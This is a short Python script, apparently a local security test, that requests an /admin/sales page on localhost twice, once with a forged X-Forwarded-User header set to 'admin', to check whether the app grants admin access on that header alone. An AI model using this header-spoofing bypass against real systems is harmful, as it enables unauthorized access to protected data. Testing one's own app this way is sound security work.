# scripts/header_attack.py
import requests

resp = requests.get(
    "http://localhost:3000/admin/sales",
    headers={ "X-Forwarded-User": "user" }
)

print(resp.status_code, resp.text)

resp = requests.get(
    "http://localhost:3000/admin/sales",
    headers={ "X-Forwarded-User": "admin" }
)

print(resp.status_code, resp.text)
